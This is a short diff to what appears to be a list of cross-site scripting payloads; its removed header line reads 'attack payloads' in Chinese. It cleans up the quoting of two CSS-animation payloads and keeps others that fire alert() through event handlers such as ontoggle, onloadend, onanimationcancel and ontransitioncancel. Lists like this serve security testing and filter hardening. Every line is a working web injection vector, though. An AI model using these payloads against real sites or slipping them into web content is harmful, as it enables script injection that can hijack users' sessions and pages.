@@ -1,10 +1,7 @@
-攻击载荷
 <img src="1.png">
 test123<XSS>=&{()}
-"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><a id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></a>
-"
-"<style>@keyframes slidein {}</style><a style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></a>
-"
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><a id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></a>
+<style>@keyframes slidein {}</style><a style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></a>
 <image src=validimage.png onloadend=alert(28)>
 <details ontoggle=alert(1) open>test</details>
 <style>:target {color: red;}</style><a id=x style="transition:color 10s" ontransitioncancel=alert(42)></a>
